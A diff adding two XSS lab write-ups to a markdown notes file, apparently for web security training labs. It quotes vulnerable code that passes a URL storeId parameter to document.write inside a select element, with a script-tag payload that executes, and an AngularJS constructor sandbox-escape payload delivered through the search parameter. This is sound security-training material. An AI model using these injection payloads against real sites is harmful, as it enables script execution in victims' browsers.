@@ -142,7 +142,65 @@ document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIC
 ```
 
 ### DOM XSS in `document.write` sink using source `location.search` inside a select element
+```js
+// vulnerable portion:
+
+<form id="stockCheckForm" action="/product/stock" method="POST">
+	<input required type="hidden" name="productId" value="2">
+	<script>
+		var stores = ["London","Paris","Milan"];
+		var store = (new URLSearchParams(window.location.search)).get('storeId'); //supply "storeId" in params
+		document.write('<select name="storeId">');
+		if(store) { //right here
+			document.write('<option selected>'+store+'</option>');
+		}
+		for(var i=0;i<stores.length;i++) {
+			if(stores[i] === store) {
+				continue;
+			}
+			document.write('<option>'+stores[i]+'</option>');
+		}
+		document.write('</select>');
+	</script>
+	<button type="submit" class="button">Check stock</button>
+</form>
+<span id="stockCheckResult"></span>
+<script src="/resources/js/stockCheckPayload.js"></script>
+<script src="/resources/js/stockCheck.js"></script>
+
+// payload
+
+/product?productId=2&storeId=alert(1)
+
+// now the list has "alert(1)", but nothing executes
+
+/product?productId=2&storeId=javascript:alert(1)
+
+// now the list has "javascript:alert(1)", but again nothing executes
+
+/product?productId=2&storeId=<script>alert(1)</script>
+
+// now it executes
 ```
 
+### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded [sauce](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md#storedreflected-xss---simple-alert-in-angularjs)
+```js
+// nothing fancy - just see that there's a AngularJS being used:
+
+/resources/js/angular_1-7-7.js
+
+/*
+ AngularJS v1.7.7
+ (c) 2010-2018 Google, Inc. http://angularjs.org
+ License: MIT
+*/
+
+// then just use this payload:
+
+{{constructor.constructor('alert(1)')()}}
+
+// how it looks like:
+
+/?search=asdf{{constructor.constructor('alert(1)')()}}
 ```
 
